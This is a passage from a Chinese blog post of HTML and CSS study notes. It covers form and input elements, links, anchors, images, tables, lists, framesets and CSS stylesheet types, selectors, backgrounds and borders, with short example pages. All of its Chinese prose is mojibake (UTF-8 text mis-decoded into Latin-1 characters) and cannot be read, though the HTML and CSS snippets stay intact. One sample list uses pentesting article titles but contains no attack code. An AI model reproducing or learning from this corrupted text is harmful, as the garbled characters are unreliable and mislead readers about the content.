class="headerlink" title="formè¡¨å•"></a>formè¡¨å•</h2><p>formè¡¨å• è§„å®šå½“æäº¤è¡¨å•æ—¶å‘ä½•å¤„å‘é€è¡¨å•æ•°æ®</p><p>method æäº¤çš„æ–¹æ³•æœ‰ getã€post</p><p>è§„å®šåœ¨å‘é€è¡¨å•æ•°æ®ä¹‹å‰å¦‚ä½•å¯¹å…¶è¿›è¡Œç¼–ç ï¼š</p><p><strong>enctype å±æ€§å¯èƒ½çš„å€¼ï¼š</strong></p><p>â€‹        application/x-www-form-urlencoded</p><p>â€‹        multipart/form-data</p><p>â€‹        text/plain</p><p><strong>inputæ ‡ç­¾:</strong></p><p>nameï¼šåŒæ ·æ˜¯è¡¨ç¤ºçš„è¯¥æ–‡æœ¬è¾“å…¥æ¡†åç§°ã€‚</p><p>sizeï¼šè¾“å…¥æ¡†çš„é•¿åº¦å¤§å°ã€‚</p><p>maxlengthï¼šè¾“å…¥æ¡†ä¸­å…è®¸è¾“å…¥å­—ç¬¦çš„æœ€å¤§æ•°ã€‚</p><p>valueï¼šè¾“å…¥æ¡†ä¸­çš„é»˜è®¤å€¼</p><p>readonlyï¼šè¡¨ç¤ºè¯¥æ¡†ä¸­åªèƒ½æ˜¾ç¤ºï¼Œä¸èƒ½æ·»åŠ ä¿®æ”¹ã€‚</p><p><strong>inputçš„ç±»å‹:</strong></p><p>type=password å¯†ç è¾“å…¥æ¡†</p><p>type=file æ–‡ä»¶ä¸Šä¼ </p><p>type=hidden éšè—åŸŸ</p><p>button æŒ‰é’®</p><p>checkbox å¤é€‰æ¡†</p><p>radio å•é€‰æ¡†</p><p>type=submit æäº¤æŒ‰é’®</p><p>type=reset  é‡ç½®æŒ‰é’®</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;è¿™æ˜¯ä¸€ä¸ªè¡¨å•e&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;            &lt;label&gt;ç”¨æˆ·å: &lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; size=&quot;30&quot; maxlength=&quot;6&quot; value=&quot;sakura&quot; readonly=&quot;&quot; /&gt;&lt;/br&gt;            &lt;label&gt;å¯†&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ç :&lt;/label&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;  /&gt;&lt;/br&gt;            &lt;label&gt;æŠ€&amp;nbsp;èƒ½:&lt;/label&gt;å®‰å…¨å¼€å‘&lt;input type=&quot;checkbox&quot; /&gt;æ¸—é€æµ‹è¯•&lt;input type=&quot;checkbox&quot; /&gt;&lt;/br&gt;            &lt;label&gt;æ€§&amp;nbsp;åˆ«:&lt;/label&gt;ç”·&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;1&quot; /&gt;å¥³&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;2&quot; /&gt;            &lt;input type=&quot;hidden&quot; value=&quot;1&quot; /&gt;&lt;/br&gt;            &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot; /&gt;            &lt;input type=&quot;reset&quot; value=&quot;é‡ç½®&quot; /&gt;            &lt;input type=&quot;button&quot; value=&quot;button&quot; /&gt;        &lt;/form&gt;        &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;            &lt;input type=&quot;file&quot; value=&quot;file&quot; /&gt;            &lt;input type=&quot;submit&quot; /&gt;        &lt;/form&gt;            &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324210305845.png" alt="image-20220324210305845"></p><h2 id="aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾"><a href="#aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾" class="headerlink" title="aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾"></a>aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾</h2><pre><code class="html">aæ ‡ç­¾çš„ä½œç”¨ï¼šå°±æ˜¯ç”¨äºæ§åˆ¶ç•Œé¢ä¸é¡µé¢ä¹‹é—´çš„è·³è½¬é»˜è®¤å°±æ˜¯selfselfï¼šç”¨äºåœ¨å½“å‰é€‰é¡¹å¡ä¸­è·³è½¬ï¼Œä¹Ÿå°±æ˜¯ä¸æ–°å»ºé¡µé¢è·³è½¬_blank ï¼šç”¨äºåœ¨æ–°çš„é€‰é¡¹å¡ä¸­è·³è½¬ï¼Œä¹Ÿå°±æ˜¯æ–°å»ºé¡µé¢è·³è½¬&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;self&quot;&gt;ç™¾åº¦&lt;/a&gt;&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;ç™¾åº¦&lt;/a&gt;_blank    åœ¨æ–°çª—å£ä¸­æ‰“å¼€è¢«é“¾æ¥æ–‡æ¡£ã€‚_self    é»˜è®¤ã€‚åœ¨ç›¸åŒçš„æ¡†æ¶ä¸­æ‰“å¼€è¢«é“¾æ¥æ–‡æ¡£ã€‚_parent    åœ¨çˆ¶æ¡†æ¶é›†ä¸­æ‰“å¼€è¢«é“¾æ¥æ–‡æ¡£ã€‚_top    åœ¨æ•´ä¸ªçª—å£ä¸­æ‰“å¼€è¢«é“¾æ¥æ–‡æ¡£ã€‚</code></pre><h2 id="é”šæ–‡æœ¬"><a href="#é”šæ–‡æœ¬" class="headerlink" title="é”šæ–‡æœ¬"></a>é”šæ–‡æœ¬</h2><pre><code class="html">&lt;a name=&quot;top&quot;&gt;é”šç‚¹&lt;/a&gt;&lt;a href=&quot;#top&quot;&gt;é”šç‚¹&lt;/a&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212519652.png" alt="image-20220324212519652"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212536673.png" alt="image-20220324212536673"></p><h2 id="imgæ ‡ç­¾"><a href="#imgæ ‡ç­¾" class="headerlink" title="imgæ ‡ç­¾"></a>imgæ ‡ç­¾</h2><pre><code class="html">img å…ƒç´ å‘ç½‘é¡µä¸­åµŒå…¥ä¸€å¹…å›¾åƒã€‚&lt;img src=&quot;img/sakura.jpg&quot; width=&quot;400&quot; height=&quot;500&quot; alt=&quot;logo&quot;/&gt;alt è§„å®šå›¾åƒçš„æ›¿ä»£æ–‡æœ¬ã€‚src  è§„å®šæ˜¾ç¤ºå›¾åƒçš„urlwidth è§„å®šå›¾ç‰‡çš„é«˜åº¦height è§„å®šå›¾ç‰‡çš„å®½åº¦</code></pre><p>  <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324213845918.png" alt="image-20220324213845918"></p><h2 id="tableè¡¨æ ¼"><a href="#tableè¡¨æ ¼" class="headerlink" title="tableè¡¨æ ¼"></a>tableè¡¨æ ¼</h2><pre><code class="html">&lt;caption&gt;æˆ‘çš„æ ‡é¢˜&lt;/caption&gt;è¡¨æ ¼å¸¦æ ‡é¢˜border è¾¹æ¡†width å®½åº¦height é«˜åº¦colspan åˆå¹¶è¡Œrowspan åˆå¹¶ç«–&lt;th&gt;&lt;/th&gt; å®šä¹‰è¡¨æ ¼å†…çš„è¡¨å¤´å•å…ƒæ ¼&lt;tr&gt;è¡Œ&lt;/tr&gt;&lt;td&gt;è¡¨æ ¼&lt;/td&gt;cellpadding å•å…ƒè¾¹ä¸å†…å®¹çš„ç©ºç™½cellspacing å•å…ƒæ ¼çš„ç©ºç™½</code></pre><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;table border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;10&quot;&gt;            &lt;caption&gt;HYå’ŒWYFâ¤&lt;/caption&gt;            &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;å§“å&lt;/th&gt;&lt;th&gt;å¹´é¾„&lt;/th&gt;&lt;th&gt;åœ¨ä¸€èµ·æ—¶é—´&lt;/th&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;HY&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;td rowspan=&quot;2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;299å¤©&lt;/td&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;WYF&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;/tr&gt;        &lt;/table&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324220335722.png" alt="image-20220324220335722"></p><h2 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h2><pre><code class="html">&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><h3 id="æ— åºåˆ—è¡¨"><a href="#æ— åºåˆ—è¡¨" class="headerlink" title="æ— åºåˆ—è¡¨"></a>æ— åºåˆ—è¡¨</h3><pre><code class="html">    é¡¹ç›®ç¬¦å· square circle disc&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324221810168.png" alt="image-20220324221810168"></p><h3 id="æœ‰åºåˆ—è¡¨"><a href="#æœ‰åºåˆ—è¡¨" class="headerlink" title="æœ‰åºåˆ—è¡¨"></a>æœ‰åºåˆ—è¡¨</h3><pre><code class="html">    æ•°å­—åˆ—è¡¨ é»˜è®¤ æ•°å­—    å°å†™å­—æ¯åˆ—è¡¨     å¤§å†™å­—æ¯åˆ—è¡¨ A    ç½—é©¬å­—æ¯åˆ—è¡¨  I    å°å†™ç½—é©¬å­—æ¯åˆ—è¡¨ i&lt;ol type=&quot;1&quot;&gt; &lt;!--æœ‰åºåˆ—è¡¨--&gt;            &lt;li&gt;æš—æœˆå®æˆ˜é¡¹ç›®ä¹ ä¸å‡ºç½‘çš„æƒ…å†µä¸‹çš„å†…ç½‘å¤šåŸŸæ§æ¸—é€&lt;/li&gt;            &lt;li&gt;xp/2003å¼€å…³3389æŒ‡ä»¤&lt;/li&gt;            &lt;li&gt;ä¸€æ¡å‘½ä»¤ä¿®æ”¹windowsæ³¨å†Œè¡¨&lt;/li&gt;&lt;/ol&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324222526957.png" alt="image-20220324222526957"></p><h2 id="æ¡†æ¶ä½¿ç”¨"><a href="#æ¡†æ¶ä½¿ç”¨" class="headerlink" title="æ¡†æ¶ä½¿ç”¨"></a>æ¡†æ¶ä½¿ç”¨</h2><p><strong>frameset å…ƒç´ å¯å®šä¹‰ä¸€ä¸ªæ¡†æ¶é›†ã€‚å®ƒè¢«ç”¨æ¥ç»„ç»‡å¤šä¸ªçª—å£ï¼ˆæ¡†æ¶ï¼‰ã€‚æ¯ä¸ªæ¡†æ¶å­˜æœ‰ç‹¬ç«‹çš„æ–‡æ¡£ã€‚åœ¨å…¶æœ€ç®€å•çš„åº”ç”¨ä¸­ï¼Œframeset å…ƒç´ ä»…ä»…ä¼šè§„å®šåœ¨æ¡†æ¶é›†ä¸­å­˜åœ¨å¤šå°‘åˆ—æˆ–å¤šå°‘è¡Œã€‚æ‚¨å¿…é¡»ä½¿ç”¨ cols æˆ– rows å±æ€§ã€‚</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/clip_image002.png" alt="å¸ƒå±€"></p><p>frameset åœ¨ä¸€ä¸ªé¡µé¢ä¸­è®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªæ¡†æ¶ ä¸èƒ½åµŒå¥—åœ¨bodyæ ‡ç­¾é‡Œ</p><p>iframe æ˜¯åœ¨htmlé¡µé¢å†…åµŒå…¥æ¡†æ¶ æ¡†æ¶å†…å¯ä»¥è¿æ¥å¦ä¸€ä¸ªé¡µé¢</p><p> <strong>framesetå±æ€§:</strong></p><p>â‘ border</p><p>è®¾ç½®æ¡†æ¶çš„è¾¹æ¡†ç²—ç»†ã€‚</p><p>â‘¡bordercolor</p><p>è®¾ç½®æ¡†æ¶çš„è¾¹æ¡†é¢œè‰²ã€‚</p><p>â‘¢frameborder</p><p>è®¾ç½®æ˜¯å¦æ˜¾ç¤ºæ¡†æ¶è¾¹æ¡†ã€‚è®¾å®šå€¼åªæœ‰0ã€1ï¼›0 è¡¨ç¤ºä¸è¦è¾¹æ¡†ï¼Œ1 è¡¨ç¤ºè¦æ˜¾ç¤ºè¾¹æ¡†ã€‚</p><p>â‘£cols</p><p>çºµå‘åˆ†å‰²é¡µé¢ã€‚å…¶æ•°å€¼è¡¨ç¤ºæ–¹æ³•æœ‰ä¸‰ç§ï¼šâ€œ30%ã€30ï¼ˆæˆ–è€…30pxï¼‰ã€<em>â€ï¼›æ•°å€¼çš„ä¸ªæ•°ä»£è¡¨åˆ†æˆçš„è§†çª—æ•°ç›®ä¸”æ•°å€¼ä¹‹é—´ç”¨â€œ,â€éš”å¼€ã€‚â€œ30%â€è¡¨ç¤ºè¯¥æ¡†æ¶åŒºåŸŸå å…¨éƒ¨æµè§ˆå™¨é¡µé¢åŒºåŸŸçš„30%ï¼›â€œ30â€è¡¨ç¤ºè¯¥åŒºåŸŸæ¨ªå‘å®½åº¦ä¸º30åƒç´ ï¼›â€œ</em>â€è¡¨ç¤ºè¯¥åŒºåŸŸå ç”¨ä½™ä¸‹é¡µé¢ç©ºé—´ã€‚ä¾‹å¦‚ï¼šcols=â€25%,200,*â€ è¡¨ç¤ºå°†é¡µé¢åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œå·¦é¢éƒ¨åˆ†å é¡µé¢30%ï¼Œä¸­é—´æ¨ªå‘å®½åº¦ä¸º200åƒç´ ï¼Œé¡µé¢ä½™ä¸‹çš„ä½œä¸ºå³é¢éƒ¨åˆ†ã€‚</p><p>â‘¤rows</p><p>æ¨ªå‘åˆ†å‰²é¡µé¢ã€‚æ•°å€¼è¡¨ç¤ºæ–¹æ³•ä¸æ„ä¹‰ä¸colsç›¸åŒã€‚</p><p>â‘¥framespacing</p><p>è®¾ç½®æ¡†æ¶ä¸æ¡†æ¶é—´çš„ä¿ç•™çš„ç©ºç™½è·ç¦»ã€‚</p><p> <strong>frameå±æ€§:</strong></p><p>â‘ name</p><p>è®¾ç½®æ¡†æ¶åç§°ã€‚æ­¤ä¸ºå¿…é¡»è®¾ç½®çš„å±æ€§ã€‚</p><p>â‘¡src</p><p>è®¾ç½®æ­¤æ¡†æ¶è¦æ˜¾ç¤ºçš„ç½‘é¡µåç§°æˆ–è·¯å¾„ã€‚æ­¤ä¸ºå¿…é¡»è®¾ç½®çš„å±æ€§ã€‚</p><p>â‘¢scrolling</p><p>è®¾ç½®æ˜¯å¦è¦æ˜¾ç¤ºæ»šåŠ¨æ¡ã€‚è®¾å®šå€¼ä¸ºauto, yes, noã€‚</p><p>auto åœ¨éœ€è¦çš„æƒ…å†µä¸‹å‡ºç°æ»šåŠ¨æ¡ï¼ˆé»˜è®¤å€¼ï¼‰</p><p>yes å§‹ç»ˆæ˜¾ç¤ºæ»šåŠ¨æ¡ï¼ˆå³ä½¿ä¸éœ€è¦ï¼‰</p><p>no  ä»ä¸æ˜¾ç¤ºæ»šåŠ¨æ¡ï¼ˆå³ä½¿éœ€è¦ï¼‰</p><p>â‘£bordercolor</p><p>è®¾ç½®æ¡†æ¶çš„è¾¹æ¡†é¢œè‰²ã€‚</p><p>â‘¤frameborder</p><p>è®¾ç½®æ˜¯å¦æ˜¾ç¤ºæ¡†æ¶è¾¹æ¡†ã€‚è®¾å®šå€¼åªæœ‰0ã€1ï¼›0 è¡¨ç¤ºä¸è¦è¾¹æ¡†ï¼Œ1 è¡¨ç¤ºè¦æ˜¾ç¤ºè¾¹æ¡†ã€‚</p><p>â‘¥noresize</p><p>è®¾ç½®æ¡†æ¶å¤§å°æ˜¯å¦èƒ½æ‰‹åŠ¨è°ƒèŠ‚ã€‚</p><p>â‘¦marginwidth</p><p>è®¾ç½®æ¡†æ¶è¾¹ç•Œå’Œå…¶ä¸­å†…å®¹ä¹‹é—´çš„å®½åº¦ã€‚</p><p>â‘§marginhight</p><p>è®¾ç½®æ¡†æ¶è¾¹ç•Œå’Œå…¶ä¸­å†…å®¹ä¹‹é—´çš„é«˜åº¦ã€‚</p><p>â‘¨width</p><p>è®¾ç½®æ¡†æ¶å®½åº¦ã€‚</p><p>â‘©height</p><p>è®¾ç½®æ¡†æ¶é«˜åº¦ã€‚</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235313862.png" alt="image-20220324235313862"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235247186.png" alt="image-20220324235247186"></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;frameset rows=&quot;50%,50%&quot;&gt;         &lt;frame src=&quot;https://nsl.lenovo.com.cn/&quot; scrolling=&quot;no&quot; /&gt;        &lt;frame src=&quot;http://www.sogou.com&quot; /&gt;    &lt;/frameset&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324224952975.png" alt="image-20220324224952975" style="zoom:50%;"><hr><h1 id="div-css"><a href="#div-css" class="headerlink" title="div css"></a>div css</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>å±‚å æ ·å¼è¡¨(è‹±æ–‡å…¨ç§°ï¼šCascading Style Sheets)æ˜¯ä¸€ç§ç”¨æ¥è¡¨ç°HTMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„ä¸€ä¸ªåº”ç”¨ï¼‰æˆ–XMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„ä¸€ä¸ªå­é›†ï¼‰ç­‰æ–‡ä»¶æ ·å¼çš„è®¡ç®—æœºè¯­è¨€ã€‚CSSä¸ä»…å¯ä»¥é™æ€åœ°ä¿®é¥°ç½‘é¡µï¼Œè¿˜å¯ä»¥é…åˆå„ç§è„šæœ¬è¯­è¨€åŠ¨æ€åœ°å¯¹ç½‘é¡µå„å…ƒç´ è¿›è¡Œæ ¼å¼åŒ–ã€‚</p><p>CSS èƒ½å¤Ÿå¯¹ç½‘é¡µä¸­å…ƒç´ ä½ç½®çš„æ’ç‰ˆè¿›è¡Œåƒç´ çº§ç²¾ç¡®æ§åˆ¶ï¼Œæ”¯æŒå‡ ä¹æ‰€æœ‰çš„å­—ä½“å­—å·æ ·å¼ï¼Œæ‹¥æœ‰å¯¹ç½‘é¡µå¯¹è±¡å’Œæ¨¡å‹æ ·å¼ç¼–è¾‘çš„èƒ½åŠ›ã€‚</p><p>DIVæ˜¯htmlçš„ä¸€ä¸ªæ ‡ç­¾ cssæ˜¯ä¸€ä¸ªæ ·å¼è¡¨</p><h2 id="æ ·å¼è¡¨ç±»å‹"><a href="#æ ·å¼è¡¨ç±»å‹" class="headerlink" title="æ ·å¼è¡¨ç±»å‹"></a>æ ·å¼è¡¨ç±»å‹</h2><h3 id="åµŒå…¥å¼æ ·å¼è¡¨"><a href="#åµŒå…¥å¼æ ·å¼è¡¨" class="headerlink" title="åµŒå…¥å¼æ ·å¼è¡¨"></a>åµŒå…¥å¼æ ·å¼è¡¨</h3><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;        &lt;style&gt;            .demo01&#123;                color: mediumvioletred;                width: 1000px;                height: 500px;                background: salmon;            &#125;        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div class=&quot;demo01&quot;&gt;            äººç”Ÿè‹¥åªå¦‚åˆè§ï¼Œä½•äº‹ç§‹é£æ‚²ç”»æ‰‡        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325210711988.png" alt="image-20220325210711988"></p><h3 id="å¤–éƒ¨æ ·å¼"><a href="#å¤–éƒ¨æ ·å¼" class="headerlink" title="å¤–éƒ¨æ ·å¼"></a>å¤–éƒ¨æ ·å¼</h3><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;/&gt;@import url@import url(&quot;g.css&quot;);.demo1&#123;                color: red;                width: 100px;                height: 100px;                background: blue;            &#125;</code></pre><p><strong>1ã€linkç›´æ¥å¼•ç”¨</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325211849732.png" alt="image-20220325211849732"></p><p><strong>2ã€åœ¨å¤–éƒ¨å†å¼•ç”¨å¤–éƒ¨</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212537499.png" alt="image-20220325212537499"></p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212557848.png" alt="image-20220325212557848" style="zoom:50%;"><h3 id="å†…è”æ ·å¼"><a href="#å†…è”æ ·å¼" class="headerlink" title="å†…è”æ ·å¼"></a>å†…è”æ ·å¼</h3><pre><code class="html">&lt;div style=&quot;color: blue;width: 100px;height: 100px; background: black;&quot;&gt;demo2&lt;/div&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325213538813.png" alt="image-20220325213538813"></p><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><pre><code class="html">/* */ æ³¨é‡Šå†…å®¹</code></pre><h2 id="æ ·å¼é€‰æ‹©å™¨"><a href="#æ ·å¼é€‰æ‹©å™¨" class="headerlink" title="æ ·å¼é€‰æ‹©å™¨"></a>æ ·å¼é€‰æ‹©å™¨</h2><pre><code class="html">å…ƒç´ é€‰æ‹©å™¨   div&#123;å±æ€§:å€¼&#125;IDé€‰æ‹©å™¨  #id&#123;å±æ€§:å€¼&#125;classé€‰æ‹©å™¨  .ç±»å&#123;å±æ€§:å€¼&#125;å­é€‰æ‹©å™¨    å…ƒæ•° ç©ºæ ¼ å…ƒç´ &#123;å±æ€§:å€¼&#125;åä»£é€‰æ‹©å™¨  å…ƒæ•° &gt; å…ƒæ•°&#123;å±æ€§:å€¼&#125;å±æ€§é€‰æ‹©å™¨  å…ƒç´ [å±æ€§]&#123;&#125;é€šé…ç¬¦é€‰æ‹©å™¨  *&#123;å±æ€§:å€¼&#125;ç¾¤ç»„é€‰æ‹©å™¨  æŠŠç›¸åŒçš„å…ƒç´ å†™åœ¨ä¸€èµ·</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220117278.png" alt="image-20220325220117278"></p><p><strong>é€šé…ç¬¦é€‰æ‹©å™¨ç¤ºæ„</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220708388.png" alt="image-20220325220708388"></p><p><strong>ç¾¤ç»„é€‰æ‹©å™¨</strong></p><p>æŠŠç›¸åŒçš„å…ƒç´ å†™åœ¨ä¸€èµ·ï¼Œå‡å°‘é‡å¤ä»£ç </p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325221110722.png" alt="image-20220325221110722"></p><p><strong>å­é€‰æ‹©å™¨/åä»£é€‰æ‹©å™¨</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325222155359.png" alt="image-20220325222155359"></p><h2 id="èƒŒæ™¯å’Œè¾¹æ¡†"><a href="#èƒŒæ™¯å’Œè¾¹æ¡†" class="headerlink" title="èƒŒæ™¯å’Œè¾¹æ¡†"></a>èƒŒæ™¯å’Œè¾¹æ¡†</h2><h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>background-color   è§„å®šè¦ä½¿ç”¨çš„èƒŒæ™¯é¢œè‰²ã€‚</p><p>background-position    è§„å®šèƒŒæ™¯å›¾åƒçš„ä½ç½®ã€‚    </p><p>background-size     è§„å®šèƒŒæ™¯å›¾ç‰‡çš„å°ºå¯¸ã€‚    </p><p>background-repeat  è§„å®šå¦‚ä½•é‡å¤èƒŒæ™¯å›¾åƒã€‚  </p><pre><code>repeat  é»˜è®¤ã€‚èƒŒæ™¯å›¾åƒå°†åœ¨å‚ç›´æ–¹å‘å’Œæ°´å¹³æ–¹å‘é‡å¤ã€‚repeat-x èƒŒæ™¯å›¾åƒå°†åœ¨æ°´å¹³æ–¹å‘é‡å¤ã€‚repeat-y èƒŒæ™¯å›¾åƒå°†åœ¨å‚ç›´æ–¹å‘é‡å¤ã€‚no-repeat   èƒŒæ™¯å›¾åƒå°†ä»…æ˜¾ç¤ºä¸€æ¬¡ã€‚inherit  è§„å®šåº”è¯¥ä»çˆ¶å…ƒç´ ç»§æ‰¿ background-repeat å±æ€§çš„è®¾ç½®ã€‚</code></pre><p>background-origin  è§„å®šèƒŒæ™¯å›¾ç‰‡çš„å®šä½åŒºåŸŸã€‚    </p><p>background-clip     è§„å®šèƒŒæ™¯çš„ç»˜åˆ¶åŒºåŸŸã€‚    </p><p>background-attachment  è§„å®šèƒŒæ™¯å›¾åƒæ˜¯å¦å›ºå®šæˆ–è€…éšç€é¡µé¢çš„å…¶ä½™éƒ¨åˆ†æ»šåŠ¨ã€‚    </p><pre><code class="html">èƒŒæ™¯å›¾ç‰‡çš„æ»šåŠ¨èƒŒæ™¯å›¾ç‰‡æ˜¯å¦éšç€å†…å®¹çš„æ»šåŠ¨è€Œæ»šåŠ¨ç”±background-attachmentè®¾ç½®background-attachment:fixed; å›ºå®šï¼Œä¸éšå†…å®¹çš„æ»šåŠ¨è€Œæ»šåŠ¨background-attachment:scroll; æ»šåŠ¨ï¼Œéšå†…å®¹çš„æ»šåŠ¨è€Œæ»šåŠ¨</code></pre><p>background-image  è§„å®šè¦ä½¿ç”¨çš„èƒŒæ™¯å›¾åƒã€‚</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224711431.png" alt="image-20220325224711431"></p><p>ä¸Šè¿°bodyå¯ç›´æ¥ç®€å†™ä¸º</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224906687.png" alt="image-20220325224906687"></p><p>inherit  è§„å®šåº”è¯¥ä»çˆ¶å…ƒç´ ç»§æ‰¿ background å±æ€§çš„è®¾ç½®ã€‚  </p><p>left top</p><p>left center</p><p>left bottom</p><p>right top</p><p>right center</p><p>right bottom</p><p>center top</p><p>center center</p><p>center bottom</p><h3 id="è¾¹æ¡†"><a href="#è¾¹æ¡†" class="headerlink" title="è¾¹æ¡†"></a>è¾¹æ¡†</h3><p>è¾¹æ¡†é¢œè‰² border-color:#000</p><p>è¾¹æ¡†å®½åº¦ border-width:1px;</p><p>border-left è®¾ç½®å·¦è¾¹æ¡†ï¼Œä¸€èˆ¬å•ç‹¬è®¾ç½®å·¦è¾¹æ¡†æ ·å¼ä½¿ç”¨</p><p>border-right è®¾ç½®å³è¾¹æ¡†ï¼Œä¸€èˆ¬å•ç‹¬è®¾ç½®å³è¾¹æ¡†æ ·å¼ä½¿ç”¨</p><p>border-top è®¾ç½®ä¸Šè¾¹æ¡†ï¼Œä¸€èˆ¬å•ç‹¬è®¾ç½®ä¸Šè¾¹æ¡†æ ·å¼ä½¿ç”¨</p><p>border-bottom è®¾ç½®ä¸‹è¾¹æ¡†ï¼Œä¸€èˆ¬å•ç‹¬è®¾ç½®ä¸‹è¾¹æ¡†æ ·å¼ä½¿ç”¨,æœ‰æ—¶å¯å°†ä¸‹è¾¹æ¡†æ ·å¼ä½œä¸ºcssä¸‹åˆ’çº¿æ•ˆæœåº”ç”¨ã€‚</p><p><strong>è¾¹æ¡†æ ·å¼å€¼å¦‚ä¸‹ï¼š</strong></p><p>none : ã€€æ— è¾¹æ¡†ã€‚ä¸ä»»ä½•æŒ‡å®šçš„border-widthå€¼æ— å…³</p><p>hidden : 